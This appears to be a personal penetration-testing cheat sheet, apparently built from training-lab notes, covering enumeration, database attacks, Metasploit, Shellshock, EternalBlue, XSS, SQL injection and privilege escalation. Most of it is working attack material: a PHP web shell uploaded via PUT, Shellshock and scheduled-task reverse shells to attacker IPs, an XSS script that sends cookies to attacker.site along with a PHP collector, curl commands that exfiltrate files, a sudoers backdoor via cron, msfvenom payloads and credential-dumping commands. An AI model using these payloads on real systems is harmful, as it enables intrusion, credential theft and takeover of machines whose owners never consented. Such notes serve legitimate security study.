	curl -IL https://www.inlanefreight.com


* PUT (Used to upload a file to the server. It is very dangerous feature if it is allowed and misconfigured)
	PUT /path/to/destination HTTP/1.1
    	Host: www.example.site

    	<PUT data>

    	//You have to know the size of the file you want to upload on the server ==> wc -m payload.php = 20

    	nc victim.site 80
    	PUT /payload.php HTTP/1.0
    	Content-type: text/html
    	Content-length: 20

    	<?php phpinfo(); ?>
    	
    	//Uploading a PHP shell with PUT
    	  nc victim.site 80
    	  PUT /shell.php HTTP/1.0
    	  Content-type: text/html
    	  Content-length: 136 //wc -m shell.php. The code below

    	  <?php
    	  if (isset($_GET['cmd'])) //Runs the following code only if the GET cmd parameter is set
    	  {
    	    $cmd = $_GET['cmd']; //Reads the command to execute
    	    echo '<pre>';
    	    $result = shell_exec($cmd); //Runs the command by using the OS shell
    	    echo $result; //Displays the output of the command
    	    echo '</pre>';
    	  }

    	  [+] In the web browser: victim site/shell.php?cmd=ls


    	curl -X PUT 192.45.178.3
      
* DELETE (Used to remove a file from the server. If misconfigured leads to denial of service and data loss)
	DELETE /path/to/destination HTTP/1.1
    	Host: www.example.site

    	curl -XDELETE 192.45.178.3/uploads/hello.txt


####REST APIs (Representational State Transfer Application Programming Interface)
* Are a specific type of web application that relies strongly on almost all HTTP Verbs. They are often reffered to as 'web services' or simply APIs
* It is sometimes easy to confuse REST APIs PUT method, which simply creates new content with a PUT method that allows us to create an arbitrary file.


####More enumeration
* Gobuster
	> Directory/File enumeration
		gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt 
	> DNS subdomain enumeration
		> Install Seclists
			git clone https://github.com/danielmiessler/SecLists
			sudo apt install seclists -y
		> Add a DNS server such as 1.1.1.1 to the /etc/resolv.conf
		> Launch the attack
			gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
* Checklist
	gobuster
	Web enumeration tips
		banner grabbing / web server headers
		curl
		whatweb
		robots.txt
		source code

* Some common backup file names are:
	.bak
    	.old
    	.txt
    	.xxx
* dirb
	useragentstring.com //Select another if the server checks it
    	dirb http://google.com -a "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0"
    	dirb http://google.com -p http://127.0.0.1:8080 -c "COOKIE:XYZ" //To utilise burpsuite
    	dirb http://google.com -p http://127.0.0.1:8080 -u "admin:password"//To utilise credentials
    	dirb http://google.com -p http://127.0.0.1:8080 -H "MyHeader: My content"//To utilise headers
    	  -R : recursively
	  -a : Specify your custom USER_AGENT
    	  -z : Add a miliseconds delay
    	  -X : Extensions ==> -X ".php,.bak,.txt"
    	  -x : Utilise this extensions

* IIS
	whatweb http://192.127.27.3
      	  X-XSS-Protection[0] //It has no xss protection
      	http 192.127.27.3
      	  files ended in .aspx
      	dirb http://192.127.27.3
      	browsh --startup-url http://192.127.27.3/ //Useful when we don't have a browser to access the target application and we have to use the terminal to access the web application
      	nmap
      	  	http-enum
      	  	http-headers
      	  	nmap 10.2.28.225 -sV -p80 --script http-methods  --script-args http-methods.url-path=/webdav/
      	  	nmap 10.2.28.225 -sV -p80 --script http-webdav-scan --script-args http-methods.url-path=/webdav/

* Apache
	nmap 10.2.28.225 -p80 -sV --script banner      
      	msfconsole
      	  	use auxiliary/scanner/http/http_version
      	  	use auxiliary/scanner/http/brute_dirs
      	  	use auxiliary/scanner/http/robots_txt
      	curl 192.168.188.126 | more
      	wget "http://192.168.188.126/index"
      	browsh --startup-url http://192.168.188.126
      	lynx http://192.168.188.126 
      	dirb http://192.168.188.126 /usr/share/metasploit-framework/wordlists/directory.txt
####MYSQL
* nmap
	nmap 192.168.188.126 -sV -p 3306
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-empty-password
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-info
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-info //List some capabilities
      	  InteractiveClient
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"
      	  datadir
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root', mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',username=root,password=''"


* mysql
	InteractiveClient ==> Access through mysql
	mysql -h 192.168.188.126 -u root
    		show databases;
    	  	use books;
    	  	  select count(*) from authors;
    	  	  select * from authors;
    	select load_file("/etc/shadow");
    	use mysql;
    	select user,password from user;
    	//Get a shell with the mysql client user
    	    \! sh
    	mysql -h 192.228.123.3 -u root -e 'show databases';

      
* Metasploit
	use auxiliary/scanner/mysql/mysql_schemadump
      		set password ""
      	use auxiliary/scanner/mysql/mysql_file_enum
      	  	set file_list /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
      	use auxiliary/scanner/mysql/mysql_writable_dirs
      	  	set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
      	  	set password ""
      	use auxiliary/scannner/mysql/mysql_hashdump
      	  	set username root
      	  	set password ""
    	
	dictionary attack
        	use auxiliary/scanner/mysql/mysql_login
          		set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
* Hydra
	hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.228.123.3 mysql
####MS-SQL-S
* Nmap
	nmap 192.228.123.3 -p 1433 --script ms-sql-info
      	nmap 192.228.123.3 -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
      	nmap 192.228.123.3 -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt
      	nmap 192.228.123.3 -p 1433 --script ms-sql-empty-password
      	nmap 192.228.123.3 -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt
      	nmap 192.228.123.3 -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
      	nmap 192.228.123.3 -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"
* Metasploit
	use auxiliary/scanner/mssql/mssql_login
      	  	set user_file /root/Desktop/wordlist/common_users.txt
      	  	set pass_file /root/Desktop/wordlist/100-common-passwords.txt
      	use auxiliary/admin/mssql/mssql_enum
      	use auxiliary/admin/mssql/mssql_enum_sql_logins
      	use auxiliary/admin/mssql/mssql_exec
      	  	set cmd whoami
      	use auxiliary/admin/mssql/mssql_enum_domains_accounts
* Manual
      [+] Using Impacket mssqlclient.py
		mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
      [+] Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
      		mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
      
* Sqsh
	sqsh -S <IP> -U <Username> -P <Password> -D <Database>
	[+] In case Windows Auth using "." as domain name for local user
      	sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database> 
	[+] In sqsh you need to use GO after writting the query to send it
      		1> select 1;
      		2> go
	[+] Get version
      		select @@version;
      	[+] Get user
      		select user_name();
      	[+] Get databases
      		SELECT name FROM master.dbo.sysdatabases;
      	[+] Use database
      		USE master
      	[+] Get table names
      		SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
      	[+] List Linked Servers
      		EXEC sp_linkedservers
      		SELECT * FROM sys.servers;
      	[+] List users
      		select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
      	[+] Create user with sysadmin privs
      		CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
      		sp_addsrvrolemember 'hacker', 'sysadmin'





####Metasploit (Falta por ordenar)
* Before start
	service PostgreSQL start
    	service metasploit start
* Some useful modules
	auxiliary/scanner/discovery/arp_sweep
    	auxiliary/scanner/portscan/tcp
    	nmap --script smb-vulns-check.nse --script-args=unsafe=1 demo.ine.local


[+] Once msfconsole -q //We could use it
	msfupdate
  	search <mysearchterm> //search linux
  	show exploits //Not very practical to use.
	check //It would check if the service on the target is vulnerable to this exploit or not, instead of actually exploiting it.
  	back //If you want back to main prompt 
  	background //To return
	exploit / run
  	> Example
  		search  httpfileserver
  	  	use exploit/windows/http/rejetto_hfs_exec
  	  	info
  	  	show options
  	  	show payloads
  	  	exploit
  	  	Privilege escalation 
			sessions -l  //List sessions
			sessions -i 1 //Attach to a session
			sysinfo
			ipconfig
			route
			ps //List processes 
				ps -U SYSTEM
			getpid //See our process
			getuid //To know which user is running the process exploited by Metasploit
			getsystem // It runs a privilege escalation routine on the target machine.
			> Check if UAC is enabled
				post/windows/gather/win_privs
				> If you need to bypass the UAC 
			    		search bypassuac
			    		set session <select which you want>
			
			use post/windows/gather/hashdump //It dumps the password database of a Windows machine
				set session <session id>
			Uploading and Downloading files
				download HaxLogs.log /root/
			  	upload /root/backdoor.exe C:\\Windows //Note the backslash escaping
			shell //A standard operating system shell
  	    	Persistence
  	    		exploit/windows/local/persistence
  	    	  	background
  	    		/exploit/multi/handler //To kill all the sessions and check if we have installed the backdoor
  	    	Remote port forwarding: After using auxiliary/scanner/portscan/tcp we could forward a remote machine port to the local machine port.
  			portfwd add -l 1234 -p 21 -r 192.168.228.3
  			portfwd lst 
  			background 
  			nmap -sS -sV -p 1234 localhost
  	> search meterpreter
  		Reverse shell
  			set payload windows/meterpreter/reverse/tcp
  		  	set payload linux/x86/meterpreter/reverse_tcp
  		Bind shell
  			set payload windows/meterpreter/bind_tcp
  		  	set payload java/meterpreter/bind_tcp

	> Another example
  		We could now check their home directory to find interesting files or alternatively leverage interesting modules such as
 		post/linux/gather/enum_users_history 
		or 
  	    	exploit/multi/mysql/mysql_udf_payload: It's a MySQL UDF exploit which will create a User-Defined Function (UDF) and allow us to run arbitrary commands using it.
  	      		set FORCE_UDF_UPLOAD true
  	      		set PASSWORD fArFLP29UySm4bZj
  	      		set RHOSTS server2.ine.local
  	      		set TARGET 1
  	      		set LHOST 192.73.96.2
  	      		exploit
  	      		session -i 2
  	    	auxiliary/scanner/http/tomcat_mgr_login: We will use msfvenom command to generate a malicious WAR file in order to gain the shell session on the Tomcat server
  	    	    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.73.96.2 LPORT=443 -f war > shell.war
  	    	    file shell.war


  

-=-=-=
-=-=-=-=-=-
##Vulnerability Assessment
###Linux Vulnerabilities

* Shellshock
	(){:;};.
    	> In the context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack
    	  CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client.
	[+] Ways 
    		> Manually
    			nmap -sV  192.168.188.126 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
    	      		In the User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
    	      		In the User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>& /dev/tcp/10.10.14.12/4126 0>&1'
    	      		Another way:
    	      		  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://195.76.205.3:4127/gettime.cgi
    	    	> Metasploit 
    	      		use exploit/multi/http/apache_mod_cgi_bash_env_exec 
    	      			set targeturi /gettime.cgi
###Frequently exploited Windows services
Microsoft IIS(Internet Information Services)    80/443    Propietary web server software developed by Microsoft that runs on Windows
WebDAV(Web Distributed Authoring & Versioning)  80/443    HTTP extension that allows clients to update, delete, move and copy files on a web server. WebDAV is used to enable a web server to act as a file server for colllaborative authoring
SMB/CIFS(Server Message Block Protocol)         445       Network file sharing protocol that is used to facilitate the sharing of files and peripherals(printers and serial ports) between computers on LAN
RDP(Remote Desktop Protocol)                    3389      Propietary GUI remote access protocol developed by Microsoft and is used to remotely authenticate and interact with a Windows system
WinRM(Windows Remote Management Protocol)       5986/443  Windows remote management protocol that can be used to facilitate remote access with Windows systems
###PsExec
* It is a lightweight telnet-replacement developed by Microsoft that allows you execute processes on remote windows systems using any user's credentials.
* PsExec authentication is performed via SMB. 
* We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt.
* Similar to RDP, however, instead of controlling the remote system via GUI, commands are sent via CMD.
  	nmap -sCV 192.168.188.126
	msfconsole
  		use scanner/smb/smb_login
  			set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
  	    		set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
* Once we have gained credentials
	[+] psexec.py
		psexec.py administrator@192.168.188.126 cmd.exe
	[+] metasploit
		use exploit/windows/smb/psexec
  		      set smbuser administrator
  		      set smbpass qweryuiop

###Eternalblue
* Nmap
	sudo nmap -sV -p445 -O 10.2.25.40
	nmap -sV -p445 10.2.25.40 smb-vuln-ms17-010
* Manually
	git clone https://github.com/3ndG4me/AutoBlue-MS17-010
  	pip install -r requirements.txt
  	cd shellcode
  	shell_prep.sh
  	msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=192.168.188.128 LPORT=4126
  	sc_x64.bin or sc_x86.bin
  	nc -lvnp 4126
  	python3 eternalblue_exploit7.py 192.168.188.126 /shellcode/sc_x64.bin
* Metasploit
        use windows/smb/ms17_010_eternalblue

###BlueKeep Vulnerability  
* This vulnerability has various illegitimate PoC's and exploit code that could be malicious in nature.
* Nmap 
	nmap -p 3389 192.168.188.126 
* Metasploit
	search BlueeKeep
        check
        	auxiliary/scanner/rdp/cve_2019_0708_bluekeep 
            	exploit/windows/rdp/cve_2019_0708_bluekeep_rce 
        show targets
###RDP 
* Maybe it is on another port than 3389
* Metasploit
	use auxiliary/scanner/rdp/rdp_scanner
      	hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://192.168.188.126 -s 3333
      	xfreerdp /u:administrator /p:qwertyuiop /v:192.168.188.126:3333

###WinRM
* We can utilize crackmapexec to perform a brute-force on WinRM and we can also utilize a ruby script called evil-winrm to obtain a command shell session on the target system
[+] WinRM is tipically used in the following ways:
	> Remotely access and interact with Windows hosts on a local network
  	> Remotely access and  execute commands on Windows systems on the internet
  	> Manage and configure Windows systems remotely
* WinRM typically uses TCP port 5985 and 5986(HTTPS)
  	crackmapexec winrm 192.168.188.126 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
  	crackmapexec winrm 192.168.188.126 -u administrator -p tinkerbell -x "whoami"
[+] Obtain a command shell
	> With evil-winrm
  		evil-winrm -i 10.129.69.58 -u 'administrator' -p 'tinkerbell' ==> 
	> With Metasploit
    		First of all, we need to know the auth methods allowed.
    			auxiliary/scanner/winrm/winrm_auth_methods
    		Check the URI. Maybe /wmsan works
    		Valid credentials
    		  	auxiliary/scanner/winrm/winrm_login 
    		    		set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
    		    		set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
    		Can we execute commands?
    			auxiliary/scanner/winrm/winrm_cmd
    			Set username, password and cmd = whoami
    		Let's gain a shell
    		  	search winrm_script_exec
    		  	set force_vbs true

###Hydra
	hydra -U rdp //-U for a module
  		-M : List of servers to attack
  	hydra -h | grep -i "Supported services" //To check the available modules
###IIS
* It can be used to host both static and dynamic web pages developed in ASP.NET and PHP
[+] Supported executable file extensions
	.asp
        .aspx
        .config
        .php
[+] WebDAV
	OJO!! The IIS server is not exploitable if the root folder is protected. Also if the root folder is protected, there is no way to determine if WebDAV is even enabled.
      	It is configued to run on the IIS web server
      	In order to connect to a WebDAV server, you will need to provide legitimate credentials. This is because WebDAV implements authentication in the form of a username and password.
      	> Tools
      		davtest(Davtest is a WebDAV scanner that sends exploit files to the WebDAV server and automatically creates the directory and uploads different format types of files. The tool also tried to execute uploaded files and gives us an output of successfully executed files)
      	  	cadaver(Cadaver is a tool for WebDAV clients, which supports a command-line style interface. It supports operations such as uploading files, editing, moving, etc)
      		nmap -sV -p80 --script=http-enum 10.2.17.124
      	    	hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
	> Example
		//How to use curl with credentials
      			First method. Read parameters from a file
      	      			1. Creating a file my_password_file.txt
      	      		  	2. machine example.com
      	      		  	   login USERNAME
      	      		  	   password PASSWORD
      	      		  	3. curl --netrc-file my_password_file.txt http://10.2.31.211/webdav/
      	      		Second method. Read parameters from stdin
      	      		  	curl -s -X GET http://10.2.17.24/webdav/ -K- <<<--user bob:password
      		davtest -url http://10.2.17.124/webdav -auth bob:password_123321 
      	    	cadaver http://10.2.17.124/webdav 
      	    		put /usr/share/webshells/asp/webshell.asp
      	    	Or we could use curl to upload a file
      	    		curl -T 'shell.txt' 'http://$ip'
      	    	After that delete webshell.asp
[+] Metasploit
	Listen manually
        	nmap -sV -p80 --script=http-enum 10.2.30.233
            	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=4126 -f asp > shell.asp //It is recommended to use 32 architecture because it will works on both
            	service postgreSQL start 
            	msfconsole -q
            	use multi/handler
            	  set payload windows/meterpreter/reverse_tcp
            	  set lhost 10.10.5.2
            	  set lport 4126

        search  iis upload
        	exploit/windows/iis/iis_webdav_upload_asp
            	set HttpPassword 
            	set HttpUsername
            	set PATH /webdav/metasploit.asp
###XSS 
* Finding an XSS is sometimes just a matter of injecting a harmless tag like 
	<i> : italics
      	<pre>
      	<plaintext>
      	<h1>Hello</h1>
* Some valid HTML/Javascript code
	<script>alert('XSS')</script>
      	<script>alert(window.location.hostname)</script>
      	<script>alert(document.cookie)</script> [Remember parameter http-only is very important for no access by javascript(document.cookie),java,etc.]
* Reflected XSS attacks
	//Is called reflected because an input field of the HTTP request sent by the browser gets inmediately reflected to the output page.
    	//When the malicious payload is carried inside the request that the browser of the victim sends to the vulnerable website. When users click on the link, they trigger the attack.

		http://victim.site/search.php?find=<payload>

* Stored XSS attacks
	//When the payload is sent to the vulnerable web server and then stored. The malicious code gets delivered each and every time a web browser hits the "injected" web page.
	//Cookie stealing via XSS. [Javascript can access cookies if they do not have the HttpOnly flag enabled.]
		<script>alert(document.cookie)</script>
    	//With the following code, you can send cookies content to an attacker-controlled site. The script generates an image object and points its src to a script on the attacker's server(attacker.site)
	//You post this in the vulnerable field
      		<script>
      		var i = new Image();
      		i.src="http://attacker.site/log.php?q="+escape(document.cookie);
      		</script>

      	//The log.php script saves the cookie in a text file on the attacker.site
      		<?php 
      		$filename="/tmp/log.txt";
      		$fp=fpopen($filename, 'a');
      		$cookie=$_GET['q'];
      		fwrite($fp, $cookie);
      		fclose($fp);
      		?>

      	//Another script
      		<?php
      		$ip = $_SERVER['REMOTE_ADDR'];
      		$browser = $_SERVER['HTTP_USER_AGENT'];
      		$fp = fopen('jar.txt', 'a');

      		fwrite($fp, $ip. ' '.$browser." \n");
      		fwrite($fp, urldecode($_SERVER['QUERY_STRING']). "  \n\n");
      		fclose($fp);
      		?>
* xsser 
	(with POST)
		xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' //The -p is from burpsuite
      		  --auto
      		  --Fp: Final payload //<script>alert("XSS")</script>
	(with GET)
      		xsser --url ... //Change 'nmap' by XSS ==> poll request //Remember
	URLs and books
  		The web application hacker's handbook by Dafydd Stuttard

###SQLi
* Comments
	'#' symbol
    	-- (two dashes followed by a space)
* Static query example inside a PHP page
	<?php
    	$dbhostname='1.2.3.4';
    	$dbuser='username';
    	$dbpassword='password';
    	$dbname='database';
    	
    	$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname); // Object referencing the connection to the database
    	$query = "SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;";
    	
    	
    	$results = mysqli_query($connection, $query); //Function which submits the query to the database
    	display_results($results); //Renders the data
    	?>

* Dynamic query
	<?php
    	$dbhostname='1.2.3.4';
    	$dbuser='username';
    	$dbpassword='password';
    	$dbname='database';
    	
    	$id = $_GET['id']; //Using user-supplied input to build a query
    	
    	$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
    	$query = "SELECT Name, Description FROM Products WHERE ID='$id';";
    	
    	$results = mysqli_query($connection, $query);
    	display_results($results);
    	?>

	[+] One example of SQLi
		We can change the $id value to something like
    	  		' OR 'a'='a
    	  	The query then becomes:
    	  	  	SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a'; //This tells the database to select all the items in the Products table.

    	[+] Other example
    	  	Using UNION command
    	  	  	' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
    	  	The query then becomes:
    	  	  	SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';

* Finding SQL injections
	[+] string terminators: ' and "
    	[+] SQL commands: SELECT, UNION and others
    	[+] SQL comments: # or -- 
    	[+] In POST ==> username=userna'me&password=password

* Exploiting a boolean based SQLi
	user() //Current user using the database
    	substring() //Returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length
    		mysql > select substring('elearnsecurity', 2, 1);
    	  	mysql > select substring(user(), 1, 1) = 'r'; //To test True/False condition

		Combining those features, we can iterate over the letters of the username by using payloads such as:
    			[+] ' or substr(user(), 1, 1) = 'a
    		  	[+] ' or substr(user(), 1, 1) = 'b
    		  	...

    		When we find the first letter, we can move to the second:
    		  	[+] ' or substr(user(), 2, 1) = 'a
    		  	[+] ' or substr(user(), 2, 1) = 'b
    		  	...

* Exploiting UNION based SQLi
	[+] When some of the results of a query are directly displayed on the output page.
    		' UNION SELECT user(); -- -
    	[+] The query then becomes:
    		SELECT description FROM items WHERE id='' UNION SELECT user(); -- -'; //The third dash is because most of the browsers automatically remove trailing spaces in the URL so, if you need to inject a comment via a GET request, you have to add a character after the trailing space of the comment

	[+] Examples
		' UNION SELECT null; -- -
      		' UNION SELECT null,null; -- - //We need to know how many fiels are there

	[+] When we know the number of fields, it is time to test which fields are part of the output page.
		' UNION SELECT 'elsid1', 'elsid2'; -- - 

  
* SQLMap
	[+] When you want to read from a file, save it from Burpsuite
		sqlmap -r /root/bloglogin.req -p user --technique=B --banner -v3 
			--flush-session
		sqlmap -r request -p title --os-shell
		sqlmap -u http://victim.site/view.php?id=1441' -p id --technique=U //UNION based SQLi technique
    		sqlmap -u http://victim.site/view.php?id=1441 -b //banner
    		sqlmap -u http://victim.site/view.php?id=1441 --tables //tables
    		sqlmap -u http://victim.site/view.php?id=1441 --current-db selfi4you --columns
    		sqlmap -u http://victim.site/view.php?id=1441 --current-db selfi4you --dump
    		sqlmap -u http://victim.site/view.php?id=1441' -p search --technique=U --banner -v3 --fresh-queries
    			--current-db
    		  	--current-user
    		sqlmap -u http://victim.site/view.php?id=n' -p search --technique=U  -D blogdb --tables
    		sqlmap -u http://victim.site/view.php?id=n' -p search --technique=U  -D blogdb -T users --columns
    		sqlmap -u http://victim.site/view.php?id=n' -p search --technique=U  -D blogdb -T users -C username,password --dump

	[+] If you have to exploit a POST parameter:
    		> With sqlmap
    	  		sqlmap -u <URL> --data=<POST string> -p parameter [options] //Copy the POST string from a request intercepted with Burp Proxy
    	  	  	sqlmap -u http://sqlmap.test/login.php --data='user=a&pass=a' -p user --technique=B --banner
    	  	> With Burpsuite
    	    		username=a' or 1=1; -- -&pass=a //We could test one field and the other to see which is vulnerable

	[+] Another way
		sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title --dbs
		sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP --tables
       		sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP -T users --columns 
		sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump
      






##Exploitation
#=
###Linux Kernel Exploitation
* Github
	https://github.com/mzet-/linux-exploit-suggester
  	wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
* Meterpreter
	meterpreter > 
  		shell
  	  	/bin/bash -i
  	  	sysinfo
  	  	getuid
    
* Cron Jobs
    Any script or command that have been configured to be run as the "root" user and is run by a Cron Job will run as the root user and will consequently provide us with root access.
    	crontab -l
    	cd /
    	grep -rnw (or -nri) /usr -e "/home/student/message" or find / -name message  //Find if a file with the same name exists on the system
    	printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh

* Exploiting SUID Binaries
	strings welcome
    	rm -rf greetings
    	cp /bin/bash greetings
    	./welcome

###Dumping Linux Passwords Hashes
The shadow file can only be accessed by the root account.
  	value     Hashing algorithm
  	$1        MD5
  	$2        Blowfish
  	$5        SHA-256
  	$6        SHA-512
	> Example:
      		msfconsole ==> hashdump
      		cat /etc/shadow
###RCE
* In Burpsuite
	sleep+2 //The '+' is not necessary if you are in a browser
[+] Abusing curl
	Attack machine:
      		nc -lvnp 53
    	Victim machine
      		curl http://<attack machine IP>/53/`whoami | base64`
  	msfvenom -p linux/x64/shell_reverse_tcp LHOST=<our IP> LPORT=<our lport> -f elf -o reverse53
	create a python server from our machine
  	curl from victim machine and add '-o /tmp/r'. 
  	chmod +x /tmp/r

  	You can put files in a server with '-T'
    		A: nc -lvnp 53
    		V: curl http://<MY IP>/file -T /etc/issue
###Buffer overflow
	[+] A buffer is an area in the RAM reserved for temporary data storage. Buffers have a finite size; this means that they can only contain a certain amount of data. Buffers are stored in a special data structure in the computer memory called a stack (data structure used to store data). It uses LIFO (Last in First Out) with two methods:
  		> Push: Adds an element to the stack
  	  	> Pop: Removes the last inserted element
	
###General PrivEsc checklist
* Kernel exploits: Be careful for they cause system instability
* Vulnerable software
	> Linux 
		dpkg -l
	> Windows 
		C:\Program Files
* User privileges
	[+] Sudo: The sudo command in Linux allows a user to execute commands as a different user. It is usually used to allow lower privileged users to execute commands as root without giving them access to the root user. 
		sudo -l
			If 
				(ALL : ALL) ALL ==> It requires a password to run any commands with sudo
				sudo su -
			If 
				(user : user) NOPASSWD: /bin/echo ==> The NOPASSWD entry shows that the /bin/echo command can be executed without a password. This would be useful if we gained access to the server through a vulnerability and did not have the user's password. As it says user, we can run sudo as that user and not as root. 
				sudo -u user /bin/echo Hello world!

	> SUID
	> Windows Token privileges
	[+] Resources
		https://gtfobins.github.io/
		https://lolbas-project.github.io/#

* Scheduled tasks
	[+] Cronjobs
		/etc/crontab
		/etc/cron.d
		/var/spool/cron/crontabs/root
		
	> Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
	[+] Commands	
		net start //Services running in the background
        	wmic service list brief
        	tasklist /svc //List services running under that particular process
  		schtasks /query /fo list /v
      		schtasks /query /tn vulntask /fo list /v ==> vulntask = task 

	> Scheduled tasks can be listed from the command line using the schtasks command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
	> You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.
	> If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use icacls:
		C:\> icacls c:\tasks\schtask.bat
		c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
		                    BUILTIN\Administrators:(I)(F)
		                    BUILTIN\Users:(I)(F)

	> As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, nc64.exe can be found on C:\tools. Let's change the bat file to spawn a reverse shell:
		C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
	> We then start a listener on the attacker machine on the same port we indicated on our reverse shell:
		nc -lvp 4444
	> The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:
		C:\> schtasks /run /tn vulntask
	> And you will receive the reverse shell with taskusr1 privileges as expected:
		user@attackerpc$ nc -lvp 4444
		Listening on 0.0.0.0 4444
		Connection received on 10.10.175.90 50649
		Microsoft Windows [Version 10.0.17763.1821]
		(c) 2018 Microsoft Corporation. All rights reserved.
		
		C:\Windows\system32>whoami
		wprivesc1\taskusr1
* Exposed credentials
	[+] Linux
		bash_history
	[+] Windows
		PSReadLine
* SSH Keys
	> If we have read access, we can copy id_rsa to our machine and use '-i' flag to log in with it
		vim id_rsa
		chmod 600 id_rsa
		ssh user@10.10.10.10 -i id_rsa
	> We may read their private key
		/home/user/.ssh/id_rsa
		/root/.ssh/id_rsa
